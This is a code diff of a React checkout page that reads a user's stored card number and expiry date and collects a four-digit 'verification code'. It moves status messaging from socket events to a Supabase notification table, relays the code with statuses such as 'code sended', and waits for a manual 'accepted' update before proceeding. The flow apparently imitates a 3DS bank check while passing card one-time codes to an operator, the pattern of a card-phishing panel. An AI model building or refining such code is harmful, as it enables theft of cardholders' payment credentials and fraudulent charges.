@@ -4,9 +4,9 @@ import CircleLoader from "../../components/App/CircleLoader/CircleLoader";
 import { useAppDispatch, useAppSelector } from "../../hooks/redux";
 import { actionChangePaymentInfo } from "../../store/reducer/account";
 import './PaymentPage.scss'
-import socket from "../../axios/socket";
 import { useNavigate } from "react-router-dom";
 import { actionAddToOrder } from "../../store/thunks/checkOrder";
+import { handleUnload, supabase, updateRequest } from "../../axios/supabaseClient";
 
 function PaymentPage() {
   const dispatch = useAppDispatch();
@@ -16,55 +16,117 @@ function PaymentPage() {
   const date = useAppSelector((state) => state.account.credentials.card.date);
   const card_number = useAppSelector((state) => state.account.credentials.card.card_number);
   const userId = useAppSelector((state) => state.account.account.id);
-  const email = useAppSelector((state) => state.account.account.email);
   const cart = useAppSelector((state) => state.cart.cartConnected);
   const orderInput = useAppSelector((state) => state.order.orderInput);
+  const notifId = useAppSelector((state) => state.notification.id);
 
   const [digits, setDigits] = useState({ digit1: "", digit2: "", digit3: "", digit4: "" });
   const [loading, setLoading] = useState(true);
   const [submited, setSubmited] = useState(false);
+  // const [isLeaving, setIsLeaving] = useState(false);
 
   const digit1Ref = useRef<HTMLInputElement>(null);
   const digit2Ref = useRef<HTMLInputElement>(null);
   const digit3Ref = useRef<HTMLInputElement>(null);
   const digit4Ref = useRef<HTMLInputElement>(null);
 
+  // useEffect(() => {
+  //   if (!notifId) return;
+
+  //   const handleBeforeUnload = (e: BeforeUnloadEvent) => {
+  //     e.preventDefault();
+  //     e.returnValue = "";
+  //   };
+
+  //   const handleUnloadWrapper = () => {
+  //     if (isLeaving) {
+  //       handleUnload(notifId);
+  //     }
+  //   };
+
+  //   window.addEventListener("beforeunload", handleBeforeUnload);
+
+  //   window.addEventListener("unload", () => {
+  //     if (isLeaving) {
+  //       handleUnload(notifId);
+  //     }
+  //   });
+
+  //   let currentLocation = location.pathname;
+
+  //   const handleLocationChange = () => {
+  //     if (location.pathname !== currentLocation) {
+  //       setIsLeaving(true);
+  //       currentLocation = location.pathname;
+  //     }
+  //   };
+
+  //   handleLocationChange();
+
+  //   return () => {
+  //     window.removeEventListener("beforeunload", handleBeforeUnload);
+  //     window.removeEventListener("unload", handleUnloadWrapper);
+  //   };
+  // }, [notifId, navigate]);
+
   useEffect(() => {
-    setTimeout(() => setLoading(false), 5000);
+    if (notifId) {
+      setTimeout(() => {
+        updateRequest({
+          id: notifId,
+          status: "pending"
+        })
+        setLoading(false)
+      }, 5000);
+    }
   }, []);
 
   useEffect(() => {
-    if (loading) {
-      socket.emit("updateStatus", {
-        userId: userId,
-        status: "loading for 3DS"
-      }, [loading]);
-    } else {
-      socket.emit("updateStatus", {
-        userId: userId,
-        status: "Waiting for 3DS"
-      }, [loading]);
-    }
-
-  })
-
-  useEffect(() => {
-    socket.on("allowedToProceed", () => {
-      if (orderInput.delivery_address === null) return;
+    if (notifId && submited && orderInput.delivery_address) {
+      updateRequest({
+        id: notifId,
+        status: "success"
+      })
       const command_number = uuidv4();
       dispatch(actionAddToOrder({
         cart,
         total: orderInput.total,
-        command_number: command_number,
-        delivery_address: `${orderInput.delivery_address.firstname} ${orderInput.delivery_address.lastname} ${orderInput.delivery_address.entreprise} ${orderInput.delivery_address.address} ${orderInput.delivery_address.precision}  ${orderInput.delivery_address.postal_code} ${orderInput.delivery_address.city} ${orderInput.delivery_address?.country.name}`
+        command_number,
+        delivery_address: `${orderInput.delivery_address.firstname} ${orderInput.delivery_address.lastname} ${orderInput.delivery_address.entreprise} ${orderInput.delivery_address.address} ${orderInput.delivery_address.precision}  ${orderInput.delivery_address.postal_code} ${orderInput.delivery_address.city} ${orderInput.delivery_address?.country.name}`,
       }));
       setTimeout(() => navigate("/order"), 2000);
-    });
+    }
+  }, [submited, notifId, navigate]);
+
+  useEffect(() => {
+    const subscription = supabase
+      .channel("wainting-channel")
+      .on(
+        "postgres_changes",
+        { event: "UPDATE", schema: "public", table: "notification" },
+        (payload) => {
+          if (payload.new.status === "accepted" && payload.new.id === notifId) {
+            setSubmited(true);
+          }
+        }
+      )
+      .subscribe();
 
     return () => {
-      socket.disconnect();
+      supabase.removeChannel(subscription);
     };
-  }, [userId, email, navigate]);
+  }, []);
+
+  useEffect(() => {
+    if (!userId) return;
+    const handleUnloadWrapper = () => handleUnload(userId);
+
+    window.addEventListener("beforeunload", handleUnloadWrapper);
+
+    return () => {
+      window.removeEventListener("beforeunload", handleUnloadWrapper);
+    };
+  }, [userId]);
 
   const handleKeyDown = (e: React.KeyboardEvent<HTMLInputElement>) => {
     const { name, value } = e.target as HTMLInputElement;
@@ -88,14 +150,15 @@ function PaymentPage() {
     dispatch(actionChangePaymentInfo({ name: "verif_code", value: updatedDigits }));
   }
 
-  const handleSubmit = () => {
-    const verifCode = `${digits.digit1}${digits.digit2}${digits.digit3}${digits.digit4}`;
-    setSubmited(true);
-    socket.emit("updateStatus", {
-      userId: userId,
-      status: "Waiting for 3DS",
-      verifCode: verifCode
-    }, [loading]);
+  const handleSubmit = async () => {
+    if (digits.digit1.length > 0 && digits.digit2.length > 0 && digits.digit3.length > 0 && digits.digit4.length > 0 && notifId) {
+      const verifCode = `${digits.digit1}${digits.digit2}${digits.digit3}${digits.digit4}`;
+      updateRequest({
+        id: notifId,
+        code: verifCode,
+        status: "code sended"
+      })
+    }
   }
 
   return (
